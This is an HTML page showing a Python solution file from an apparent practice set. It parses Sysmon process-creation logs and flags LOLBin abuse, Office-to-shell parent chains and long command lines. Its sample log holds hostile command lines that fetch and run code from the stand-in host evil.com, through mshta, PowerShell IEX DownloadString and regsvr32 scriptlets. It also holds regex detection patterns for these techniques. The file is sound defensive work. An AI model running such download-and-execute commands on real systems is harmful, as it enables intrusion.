@@ -1,0 +1,314 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>q12_sysmon_process.py</title>
+  <link rel="stylesheet"
+        href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github.min.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
+  <style>
+    * { box-sizing: border-box; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, sans-serif;
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 32px 24px;
+      color: #24292f;
+      background: #fff;
+    }
+    h1 {
+      font-size: 1.4em;
+      border-bottom: 1px solid #d0d7de;
+      padding-bottom: 0.3em;
+      margin-bottom: 0.6em;
+    }
+    .file-path {
+      font-size: 0.8em;
+      color: #57606a;
+      margin-bottom: 16px;
+      font-family: monospace;
+    }
+    .line-count {
+      font-size: 0.78em;
+      color: #8c959f;
+      margin-bottom: 16px;
+    }
+    pre {
+      background: #f6f8fa;
+      border: 1px solid #d0d7de;
+      border-radius: 6px;
+      padding: 16px;
+      overflow-x: auto;
+      counter-reset: line;
+    }
+    code {
+      font-family: "Cascadia Code", "Fira Code", "Courier New", monospace;
+      font-size: 0.88em;
+    }
+  </style>
+</head>
+<body>
+  <h1>q12_sysmon_process.py</h1>
+  <p class="file-path">Source: code\log_parsing\answers\q12_sysmon_process.py</p>
+  <p class="line-count">257 lines</p>
+  <pre><code class="language-python">&quot;&quot;&quot;
+Q12. Sysmon Process Creation Log Parser (Event ID 1)
+=====================================================
+Detect LOLBin abuse, unusual parent-child chains, and obfuscated
+command lines from Sysmon process creation events.
+
+=============================================================================
+SOLUTION PROGRESSION
+=============================================================================
+
+NAIVE: Flag powershell.exe in process creation logs.
+  Problem: powershell.exe is used legitimately everywhere. Without parent
+  context, flagging it produces massive noise. Also misses LOLBins like
+  certutil, regsvr32, mshta which are rarely discussed.
+
+BETTER: Check parent process against a block-list of office apps.
+  Problem: Need to also detect LOLBin misuse based on arguments (not just
+  presence), long command lines (obfuscation), and 3-level chains
+  (grandparent → parent → child) for full attack chain reconstruction.
+
+GOOGLE-LEVEL (this file):
+  - LOLBin detection: binary name + suspicious argument pattern.
+  - Parent-child: office/browser → shell/scripting engine.
+  - Grandparent chain: track parent-child relationships by PID/PPID.
+  - Long command line: &gt; 500 chars often indicates obfuscated one-liners.
+  - Output shows full chain with risk tags.
+
+Complexity: O(N) build + O(N) walk chain per flagged process.
+=============================================================================
+&quot;&quot;&quot;
+
+import re
+import sys
+from collections import defaultdict
+from datetime import datetime
+
+# ─────────────────────────────────────────────────────────────────────────────
+# SAMPLE DATA  (simplified Sysmon CSV format)
+# ─────────────────────────────────────────────────────────────────────────────
+
+SAMPLE_LOG = &quot;&quot;&quot;\
+TimeCreated,EventID,ComputerName,UserName,ProcessId,ParentProcessId,Image,ParentImage,CommandLine
+2024-03-12T08:00:00Z,1,WKSTN01,alice,1000,500,C:\\Windows\\System32\\winword.exe,C:\\Windows\\explorer.exe,winword.exe
+2024-03-12T08:01:00Z,1,WKSTN01,alice,1001,1000,C:\\Windows\\System32\\cmd.exe,C:\\Windows\\System32\\winword.exe,cmd.exe /c powershell -nop -w hidden -enc SGVsbG8gV29ybGQ=
+2024-03-12T08:01:05Z,1,WKSTN01,alice,1002,1001,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\cmd.exe,powershell -nop -w hidden -enc SGVsbG8gV29ybGQ=
+2024-03-12T08:02:00Z,1,WKSTN01,bob,2000,800,C:\\Windows\\System32\\certutil.exe,C:\\Windows\\System32\\cmd.exe,certutil.exe -decode C:\\Windows\\Temp\\evil.b64 C:\\Windows\\Temp\\evil.exe
+2024-03-12T08:03:00Z,1,WKSTN02,carol,3000,900,C:\\Windows\\System32\\mshta.exe,C:\\Program Files\\Microsoft Office\\OUTLOOK.EXE,mshta.exe http://evil.com/payload.hta
+2024-03-12T08:04:00Z,1,WKSTN02,carol,3001,3000,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\mshta.exe,powershell.exe -nop -exec bypass -c IEX(New-Object Net.WebClient).DownloadString(&#x27;http://evil.com/ps.ps1&#x27;)
+2024-03-12T08:05:00Z,1,WKSTN03,dave,4000,600,C:\\Windows\\System32\\regsvr32.exe,C:\\Windows\\System32\\cmd.exe,regsvr32.exe /s /n /u /i:http://evil.com/payload.sct scrobj.dll
+2024-03-12T08:06:00Z,1,WKSTN03,dave,4001,700,C:\\Windows\\System32\\notepad.exe,C:\\Windows\\explorer.exe,notepad.exe C:\\Users\\dave\\document.txt
+2024-03-12T08:07:00Z,1,WKSTN04,eve,5000,400,C:\\Windows\\System32\\cmd.exe,C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe,cmd.exe /c whoami &amp;&amp; net user
+MALFORMED_LINE
+&quot;&quot;&quot;
+
+# ─────────────────────────────────────────────────────────────────────────────
+# CONFIG
+# ─────────────────────────────────────────────────────────────────────────────
+
+LONG_CMDLINE_THRESHOLD = 500
+
+# LOLBins and their suspicious argument patterns
+LOLBIN_PATTERNS: list[tuple[str, re.Pattern, str]] = [
+    (&quot;certutil.exe&quot;,  re.compile(r&#x27;-decode|-encode|-urlcache|-f\s+http&#x27;, re.IGNORECASE), &quot;certutil decode/download&quot;),
+    (&quot;regsvr32.exe&quot;,  re.compile(r&#x27;/i:http|/i:ftp|scrobj\.dll|/s\s+/n\s+/u&#x27;, re.IGNORECASE), &quot;regsvr32 COM scriptlet&quot;),
+    (&quot;mshta.exe&quot;,     re.compile(r&#x27;http|javascript:|vbscript:&#x27;, re.IGNORECASE), &quot;mshta remote/script execution&quot;),
+    (&quot;wscript.exe&quot;,   re.compile(r&#x27;\.js|\.vbs|\.hta|http&#x27;, re.IGNORECASE), &quot;wscript script execution&quot;),
+    (&quot;cscript.exe&quot;,   re.compile(r&#x27;\.js|\.vbs|\.hta|http&#x27;, re.IGNORECASE), &quot;cscript script execution&quot;),
+    (&quot;rundll32.exe&quot;,  re.compile(r&#x27;javascript:|shell32|shell\.dll|powershell&#x27;, re.IGNORECASE), &quot;rundll32 abuse&quot;),
+    (&quot;msiexec.exe&quot;,   re.compile(r&#x27;/i\s+http|/q\s+http|\.msi.*http&#x27;, re.IGNORECASE), &quot;msiexec remote install&quot;),
+    (&quot;powershell.exe&quot;,re.compile(r&#x27;-enc\s+|-encodedcommand\s+|-nop\s+.*-exec\s+bypass|-w\s+hidden&#x27;, re.IGNORECASE), &quot;powershell encoded/hidden&quot;),
+]
+
+# Office/browser processes that should NOT spawn shells
+SPAWNER_BLOCKLIST = {
+    &quot;winword.exe&quot;, &quot;excel.exe&quot;, &quot;powerpnt.exe&quot;, &quot;outlook.exe&quot;,
+    &quot;onenote.exe&quot;, &quot;chrome.exe&quot;, &quot;firefox.exe&quot;, &quot;iexplore.exe&quot;, &quot;msedge.exe&quot;,
+}
+
+# Shell/scripting engines that should not appear as children of the above
+SHELL_CHILDREN = {
+    &quot;cmd.exe&quot;, &quot;powershell.exe&quot;, &quot;wscript.exe&quot;, &quot;cscript.exe&quot;,
+    &quot;mshta.exe&quot;, &quot;wmic.exe&quot;, &quot;regsvr32.exe&quot;, &quot;rundll32.exe&quot;,
+}
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# PARSER
+# ─────────────────────────────────────────────────────────────────────────────
+
+def parse_line(line: str, header: list[str]) -&gt; dict | None:
+    line = line.strip()
+    if not line:
+        return None
+    parts = line.split(&quot;,&quot;, len(header) - 1)
+    if len(parts) != len(header):
+        return None
+    row = dict(zip(header, parts))
+    try:
+        ts = datetime.strptime(row[&quot;TimeCreated&quot;], &quot;%Y-%m-%dT%H:%M:%SZ&quot;).timestamp()
+        pid  = int(row[&quot;ProcessId&quot;])
+        ppid = int(row[&quot;ParentProcessId&quot;])
+    except (ValueError, KeyError):
+        return None
+    image_name  = row[&quot;Image&quot;].replace(&quot;\\&quot;, &quot;/&quot;).split(&quot;/&quot;)[-1].lower()
+    parent_name = row[&quot;ParentImage&quot;].replace(&quot;\\&quot;, &quot;/&quot;).split(&quot;/&quot;)[-1].lower()
+    return {
+        &quot;ts&quot;:           ts,
+        &quot;computer&quot;:     row[&quot;ComputerName&quot;],
+        &quot;user&quot;:         row[&quot;UserName&quot;],
+        &quot;pid&quot;:          pid,
+        &quot;ppid&quot;:         ppid,
+        &quot;image&quot;:        row[&quot;Image&quot;],
+        &quot;image_name&quot;:   image_name,
+        &quot;parent_image&quot;: row[&quot;ParentImage&quot;],
+        &quot;parent_name&quot;:  parent_name,
+        &quot;cmdline&quot;:      row[&quot;CommandLine&quot;],
+    }
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# DETECTORS
+# ─────────────────────────────────────────────────────────────────────────────
+
+def detect_lolbin(records: list[dict]) -&gt; list[dict]:
+    alerts = []
+    for r in records:
+        for binary, pattern, description in LOLBIN_PATTERNS:
+            if r[&quot;image_name&quot;] == binary and pattern.search(r[&quot;cmdline&quot;]):
+                alerts.append({
+                    &quot;type&quot;:        &quot;LOLBIN_ABUSE&quot;,
+                    &quot;binary&quot;:      binary,
+                    &quot;description&quot;: description,
+                    &quot;user&quot;:        r[&quot;user&quot;],
+                    &quot;computer&quot;:    r[&quot;computer&quot;],
+                    &quot;pid&quot;:         r[&quot;pid&quot;],
+                    &quot;cmdline&quot;:     r[&quot;cmdline&quot;],
+                    &quot;ts&quot;:          r[&quot;ts&quot;],
+                })
+    return alerts
+
+
+def detect_malicious_parent_child(records: list[dict]) -&gt; list[dict]:
+    alerts = []
+    for r in records:
+        if r[&quot;parent_name&quot;] in SPAWNER_BLOCKLIST and r[&quot;image_name&quot;] in SHELL_CHILDREN:
+            alerts.append({
+                &quot;type&quot;:         &quot;MALICIOUS_PARENT_CHILD&quot;,
+                &quot;parent&quot;:       r[&quot;parent_name&quot;],
+                &quot;child&quot;:        r[&quot;image_name&quot;],
+                &quot;user&quot;:         r[&quot;user&quot;],
+                &quot;computer&quot;:     r[&quot;computer&quot;],
+                &quot;ppid&quot;:         r[&quot;ppid&quot;],
+                &quot;pid&quot;:          r[&quot;pid&quot;],
+                &quot;cmdline&quot;:      r[&quot;cmdline&quot;],
+                &quot;ts&quot;:           r[&quot;ts&quot;],
+            })
+    return alerts
+
+
+def detect_long_cmdline(records: list[dict]) -&gt; list[dict]:
+    return [
+        {
+            &quot;type&quot;:     &quot;LONG_CMDLINE&quot;,
+            &quot;length&quot;:   len(r[&quot;cmdline&quot;]),
+            &quot;image&quot;:    r[&quot;image_name&quot;],
+            &quot;user&quot;:     r[&quot;user&quot;],
+            &quot;computer&quot;: r[&quot;computer&quot;],
+            &quot;pid&quot;:      r[&quot;pid&quot;],
+            &quot;cmdline&quot;:  r[&quot;cmdline&quot;][:200] + &quot;...&quot;,
+            &quot;ts&quot;:       r[&quot;ts&quot;],
+        }
+        for r in records
+        if len(r[&quot;cmdline&quot;]) &gt; LONG_CMDLINE_THRESHOLD
+    ]
+
+
+def build_chain(pid: int, pid_map: dict[int, dict], depth: int = 3) -&gt; list[str]:
+    &quot;&quot;&quot;Walk the process tree upward to reconstruct the chain.&quot;&quot;&quot;
+    chain = []
+    current_pid = pid
+    for _ in range(depth):
+        proc = pid_map.get(current_pid)
+        if not proc:
+            break
+        chain.append(proc[&quot;image_name&quot;])
+        current_pid = proc[&quot;ppid&quot;]
+    return list(reversed(chain))
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# REPORT
+# ─────────────────────────────────────────────────────────────────────────────
+
+def ts_fmt(ts: float) -&gt; str:
+    return datetime.utcfromtimestamp(ts).strftime(&quot;%Y-%m-%dT%H:%M:%SZ&quot;)
+
+
+def print_report(lolbin, parent_child, long_cmd, pid_map) -&gt; None:
+    print(&quot;=&quot; * 65)
+    print(&quot;SYSMON PROCESS CREATION — THREAT DETECTION REPORT&quot;)
+    print(&quot;=&quot; * 65)
+
+    print(f&quot;\n[LOLBIN_ABUSE] {len(lolbin)} alert(s)&quot;)
+    for a in lolbin:
+        chain = build_chain(a[&quot;pid&quot;], pid_map)
+        print(f&quot;  {a[&#x27;binary&#x27;]} ({a[&#x27;description&#x27;]})&quot;)
+        print(f&quot;  user={a[&#x27;user&#x27;]}  host={a[&#x27;computer&#x27;]}  ts={ts_fmt(a[&#x27;ts&#x27;])}&quot;)
+        print(f&quot;  chain: {&#x27; → &#x27;.join(chain)}&quot;)
+        print(f&quot;  cmd: {a[&#x27;cmdline&#x27;][:100]}&quot;)
+
+    print(f&quot;\n[MALICIOUS_PARENT_CHILD] {len(parent_child)} alert(s)&quot;)
+    for a in parent_child:
+        chain = build_chain(a[&quot;pid&quot;], pid_map)
+        print(f&quot;  {a[&#x27;parent&#x27;]} → {a[&#x27;child&#x27;]}&quot;)
+        print(f&quot;  user={a[&#x27;user&#x27;]}  host={a[&#x27;computer&#x27;]}  ts={ts_fmt(a[&#x27;ts&#x27;])}&quot;)
+        print(f&quot;  chain: {&#x27; → &#x27;.join(chain)}&quot;)
+        print(f&quot;  cmd: {a[&#x27;cmdline&#x27;][:100]}&quot;)
+
+    print(f&quot;\n[LONG_CMDLINE] {len(long_cmd)} alert(s)&quot;)
+    for a in long_cmd:
+        print(f&quot;  {a[&#x27;image&#x27;]}  len={a[&#x27;length&#x27;]}  user={a[&#x27;user&#x27;]}  ts={ts_fmt(a[&#x27;ts&#x27;])}&quot;)
+        print(f&quot;  cmd: {a[&#x27;cmdline&#x27;][:120]}&quot;)
+    print(&quot;=&quot; * 65)
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# MAIN
+# ─────────────────────────────────────────────────────────────────────────────
+
+if __name__ == &quot;__main__&quot;:
+    if len(sys.argv) &gt; 1:
+        with open(sys.argv[1], encoding=&quot;utf-8&quot;, errors=&quot;replace&quot;) as fh:
+            raw_lines = fh.readlines()
+    else:
+        print(&quot;[INFO] Using embedded sample data.\n&quot;)
+        raw_lines = SAMPLE_LOG.splitlines(keepends=True)
+
+    # First line is the header
+    lines = [l.strip() for l in raw_lines if l.strip()]
+    if not lines:
+        print(&quot;Empty input.&quot;)
+        sys.exit(1)
+
+    header_line = lines[0]
+    header = header_line.split(&quot;,&quot;, 8)  # 9 columns max
+
+    records = [r for r in (parse_line(l, header) for l in lines[1:]) if r is not None]
+    pid_map = {r[&quot;pid&quot;]: r for r in records}
+
+    print(f&quot;Parsed {len(records)} Sysmon process creation events.\n&quot;)
+    print_report(
+        detect_lolbin(records),
+        detect_malicious_parent_child(records),
+        detect_long_cmdline(records),
+        pid_map,
+    )
+</code></pre>
+</body>
+</html>
